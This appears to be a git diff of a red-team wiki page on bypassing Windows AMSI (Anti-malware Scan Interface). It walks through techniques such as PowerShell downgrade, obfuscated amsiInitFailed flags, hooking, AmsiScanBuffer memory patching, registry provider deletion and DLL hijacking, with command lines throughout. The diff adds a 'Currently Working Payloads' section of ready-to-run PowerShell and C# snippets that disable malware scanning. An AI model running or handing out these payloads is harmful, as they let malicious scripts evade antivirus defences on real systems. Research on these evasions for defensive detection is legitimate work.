@@ -1,5 +1,7 @@
 # ⭕ AMSI Bypass
 
+{% embed url="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" %}
+
 Microsoft has developed AMSI (Anti-malware Scan Interface) as a method to defend against common malware execution and protect the end user. By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution to prevent arbitrary execution of code. However, other antivirus products might contain support for AMSI so organizations are not restricted to the use of windows defender.
 
 ## How AMSI Works
@@ -28,7 +30,7 @@ Microsoft implemented AMSI as a first defense to stop execution of malware multi
 | [NoAmci](https://github.com/med0x2e/NoAmci)                                              | Memory Patching | C#             |
 | [AmsiHook](https://github.com/tomcarver16/AmsiHook)                                      | Hooking         | C++            |
 
-## 1. PowerShell Downgrade
+### PowerShell Downgrade
 
 Even though that Windows PowerShell 2.0 has been deprecated by Microsoft it hasn’t been removed from the operating system. Older versions of PowerShell doesn’t contain security controls such as AMSI protection and could be utilized as a form of evasion. Downgrading the PowerShell version to an older version is trivial and requires execution of the following command:
 
@@ -38,7 +40,7 @@ powershell -version 2
 
 ![](<../../.gitbook/assets/image (238).png>)
 
-## 2. Base64 Encoding
+### Base64 Encoding
 
 Fabian Mosch used an old AMSI bypass of Matt Graeber to prove that if base64 encoding is used on strings (AmsiUtils & amsiInitFailed) that trigger AMSI and decoded at runtime could be used as an evasion defeating the signatures of Microsoft. This technique prevents AMSI scanning capability for the current process by setting the “amsiInitFailed” flag.
 
@@ -56,7 +58,7 @@ Fabian Mosch used an old AMSI bypass of Matt Graeber to prove that if base64 enc
 
 ![](<../../.gitbook/assets/image (239).png>)
 
-## 3. Hooking
+### Hooking
 
 Tom Carver created a proof of concept in the form of a DLL file which evades AMSI by hooking into the “AmsiScanBuffer” function. The “AmsiScanBuffer” will then be executed with dummy parameters. The DLL needs to be injected into the PowerShell process which the AMSI bypass will performed.
 
@@ -68,7 +70,7 @@ Tom Carver created a proof of concept in the form of a DLL file which evades AMS
 
 ![](<../../.gitbook/assets/image (234).png>)
 
-## 4. Memory Patching
+### Memory Patching
 
 Daniel Duggan released an [AMSI bypass](https://github.com/rasta-mouse/AmsiScanBufferBypass) which patches the AmsiScanBuffer() function in order to return always **AMSI\_RESULT\_CLEAN** which indicates that no detection has been found. The patch is displayed in the following line:
 
@@ -124,7 +126,7 @@ An alternative [bypass](https://www.contextis.com/us/blog/amsi-bypass) was relea
 
 ![](<../../.gitbook/assets/image (237).png>)
 
-## 5. Forcing an Error
+### Forcing an Error
 
 Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
 
@@ -160,7 +162,7 @@ $fwi=[System.Runtime.InteropServices.Marshal]::AllocHGlobal((9076+8092-8092));[R
 
 ![](<../../.gitbook/assets/image (245).png>)
 
-## 6. Registry Key Modification
+### Registry Key Modification
 
 AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. The GUID for Windows Defender is displayed below:
 
@@ -178,7 +180,7 @@ Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-9
 
 ![](<../../.gitbook/assets/image (233).png>)
 
-## 7. DLL Hijacking
+### DLL Hijacking
 
 DLL Hijacking can be also used to evade AMSI from userland as it has been described by [SensePost](https://sensepost.com/blog/2020/resurrecting-an-old-amsi-bypass/). The only requirement is to create a non-legitimate amsi.dll file and plant it on the same folder as PowerShell 64 bit which could be copied to a user writable directory. The proof of concept code has been released by SensePost and is also demonstrated below.
 
@@ -242,3 +244,49 @@ C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 Executing PowerShell outside of the standard directory will load the amsi.dll file which contains all the necessary functions to operate, however AMSI will not initiated.
 
 ![](<../../.gitbook/assets/image (244).png>)
+
+## Currently Working Payloads
+
+
+
+```
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+```
+
+```
+[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
+```
+
+```
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
+```
+
+```
+$Win32 = @"
+
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+"@
+
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+```
